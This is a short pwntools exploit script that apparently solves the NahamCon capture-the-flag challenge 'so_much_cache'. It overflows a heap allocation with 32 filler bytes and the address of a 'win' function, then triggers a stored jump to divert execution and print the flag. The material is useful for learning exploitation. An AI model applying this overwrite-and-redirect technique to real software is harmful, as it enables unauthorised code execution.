from pwn import *

binary = 'so_much_cache'
elf = context.binary = ELF(binary)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("challenge.nahamcon.com", 30848)
    else:
        return process(elf.path)

def allocate(size,data):
   p.recvuntil(b'[1-5] :')
   p.sendline(b'1')
   p.recvuntil(b'size :')
   p.sendline(size)
   p.recvuntil(b'data :')
   p.sendline(data)

def setjump():
   p.recvuntil(b'[1-5] :')
   p.sendline(b'4')

def tojump(numb):
   p.recvuntil(b'[1-5] :')
   p.sendline(b'5')
   p.recvuntil(b'(1, 2, or 3)')
   p.sendline(numb)
   flag = p.recvuntil(b'}\n').decode().strip()
   log.info(flag)

p = start() 

win_function = elf.sym['win']   # 0x004009ae

log.info("Overwriting the top chunk.",)

#aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
#aaaabbbbccccddddeeeeffffgggghhhh + win()
# a*32 + win_function

payload = b'a'*32 + p64(win_function)

allocate(b'20' , payload)

log.info("Set the jump!")
setjump()

log.info("Jump to win()")
tojump(b'1')

#p.interactive()
